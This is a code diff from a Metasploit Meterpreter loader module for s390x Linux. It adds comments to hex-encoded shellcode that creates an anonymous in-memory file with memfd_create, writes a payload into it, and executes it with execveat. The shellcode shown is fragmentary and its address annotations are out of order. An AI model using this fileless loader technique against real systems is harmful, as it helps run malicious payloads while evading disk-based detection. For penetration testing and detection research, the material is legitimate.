@@ -7,12 +7,18 @@
 module Msf::Payload::Linux::Zarch::MeterpreterLoader
   def in_memory_load(payload)
     in_memory_loader = [
+
+        # save address of current instruction into r8
         0x17770d80, #0x1000:    basr    %r8, %r0    0x0d80
+
+        # fd = memfd_create(NULL,MFD_CLOEXEC) 
         0xa7380001, #0x1002:    lhi %r3, 1  0xa7380001
         0x9200f000, #0x1006:    mvi 0(%r15), 0  0x9200f000
         0x4120f000, #0x100a:    la  %r2, 0(%r15)    0x4120f000
         0xa719015e, #0x100e:    lghi    %r1, 0x15e  0xa719015e
         0x17770a00, #0x1012:    svc 0   0x0a00
+        
+        # write(fd, payload length, payload pointer)
         0x17771862, #0x1014:    lr  %r6, %r2    0x1862
         0x17771744, #0x1016:    xr  %r4, %r4    0x1744
         0xb9040048, #0x1000:	lgr	%r4, %r8	0xb9040048
@@ -24,6 +30,8 @@ module Msf::Payload::Linux::Zarch::MeterpreterLoader
         0xa758006c, #0x1004:	lhi	%r5, 0x6c	0xa758006c
         0x17771a35, #0x102c:    ar  %r3, %r5    0x1a35
         0x17770a04, #0x102e:    svc 4   0x0a04
+        
+        # execveat(fd, null,null,null, AT_EMPTY_PATH)
         0x17771826, #0x1000:    lr  %r2, %r6    0x1826
         0x9200f000, #0x1002:    mvi 0(%r15), 0  0x9200f000
         0x4130f000, #0x1006:    la  %r3, 0(%r15)    0x4130f000
